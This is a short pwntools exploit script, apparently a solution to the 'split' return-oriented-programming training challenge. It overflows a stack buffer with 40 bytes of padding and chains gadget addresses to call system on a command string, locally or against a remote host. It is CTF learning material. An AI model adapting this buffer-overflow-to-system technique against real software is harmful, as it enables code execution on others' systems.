from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./split")


class ROP_Gadget:
    pop_rdi = 0x004007c3
    cat = 0x00601060
    ret = 0x0040053e
    system_call = 0x00400560


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.cat,
        ROP_Gadget.ret,
        ROP_Gadget.system_call
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()